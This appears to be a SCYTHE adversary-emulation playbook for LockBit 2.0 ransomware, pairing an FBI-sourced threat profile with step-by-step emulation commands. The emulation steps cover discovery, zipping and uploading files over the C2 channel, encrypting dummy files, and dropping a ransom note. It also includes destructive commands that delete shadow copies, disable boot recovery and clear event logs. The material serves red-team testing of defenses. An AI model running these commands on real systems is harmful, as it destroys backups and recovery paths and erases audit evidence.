# LockBit

## Executive Summary


## Cyber Threat Intelligence

### Profile
LockBit 2.0 operates as an affiliate-based Ransomware-as-a-Service (RaaS) and employs a wide variety of tactics, techniques, and procedures (TTPs), creating significant challenges for defense and mitigation. LockBit 2.0 ransomware compromises victim networks through a variety of techniques, including, but not limited to, purchased access, unpatched vulnerabilities, insider access, and zero day exploits. [^1]

Upon execution, Lockbit 2.0 determines the system and user language settings and only targets those not matching a set list of languages that are Eastern European. If an Eastern European language is detected, the program exits without infection. As infection begins, Lockbit 2.0 deletes log files and shadow copies residing on disk. Lockbit 2.0 enumerates system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.Lockbit 2.0 attempts to encrypt any data saved to any local or remote device but skips files associated with core system functions.

### Aliases
* LockBit Red

### Targets
* The United States is heavily targeted although organizations in much of Western Europe, China, India, Indonesia, and Ukraine have seen attacks as well.
* BlackBerry research indicates that the average ransom paid by its victims is $85,000 which is suggestive of LockBit targeting small to medium sized organizations.
* Primarily Windows systems

### Objectives

## Automated Emulation
*** Note this threat is impactful if running with high privilege ***
1. Download and import the threat in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under LockBit/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/LockBit
4. Create a new campaign with HTTPS.
5. Import from Existing Threat: LockBit
6. Launch the Campaign

## Manual Emulation

Launch a campaign with the C2 parameters you wish to use. 

Once you have a shell, execute the following procedures:
```
loader --load run
```
Determine the language of the target operating system:
```
run reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language
```
LockBit does not execute on systems set with Eastern European languages. The return of the reg query should not match
```
2092 1068 1067 1059 1079 1087 1088 2073 1049 1064 1090 2115 1091
```
Perform discovery procedures:
```
run whoami
loader --load printscr
printscr --window Desktop
loader --load sysinfo
sysinfo
loader --load processes
processes
run cmd /c dir %USERPROFILE%\Documents
run net use
```
Prepare the system for impact TTPs:
```
run cmd /c mkdir "%USERPROFILE%\Desktop\LockBit"
loader --load file
file --create --path "%USERPROFILE%\Desktop\LockBit\target_files.xls" --size 5MB --count 10 --random
```
Exfiltrate:
```
loader --load upsh
upsh --cmd "Compress-Archive -Path $env:userprofile\Desktop\LockBit -CompressionLevel Optimal -Destination $env:userprofile\Desktop\LockBit\exfil.zip"
loader --load uploader
uploader --remotepath "%USERPROFILE%\Desktop\LockBit\exfil.zip"
```
Encrypt the files:
```
file --create --path "%USERPROFILE%\Desktop\LockBit_Ransomware.hta" --size 1MB --random
loader --load crypt
crypt --target "%USERPROFILE%\Desktop\LockBit\" --encrypt --password "LockBit" --erase --extension lockbit
```
Download the ransom note and open it:
```
loader --load downloader
downloader --src "VFS:/shared/threats/LockBit/Restore-My-Files.txt" --dest "%USERPROFILE%\Desktop\LockBit\Restore-My-Files.txt"
run powershell notepad "%USERPROFILE%\Desktop\LockBit\Restore-My-Files.txt"
```
Clean up:
```
run cmd /c rmdir /Q /S ""%USERPROFILE%\Desktop\LockBit""
run cmd.exe /c del "%USERPROFILE%\Desktop\LockBit_Ransomware.hta"
```
If running with high privilege and want to run the risky TTPs:
```
controller --integrity
run vssadmin Delete Shadows /All /Quiet
run bcdedit /set {default} recoveryenabled No
run bcdedit /set {default} bootstatuspolicy ignoreallfailures
run wmic SHADOWCOPY /nointeractive
run wevtutil cl security
run wevtutil cl system
run wevtutil cl application
run vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no
```
Shutdown the payload
```
controller --shutdown
```

## References
- [FBI Flash](https://www.ic3.gov/Media/News/2022/220204.pdf)
[^1]: [FBI Flash](https://www.ic3.gov/Media/News/2022/220204.pdf)
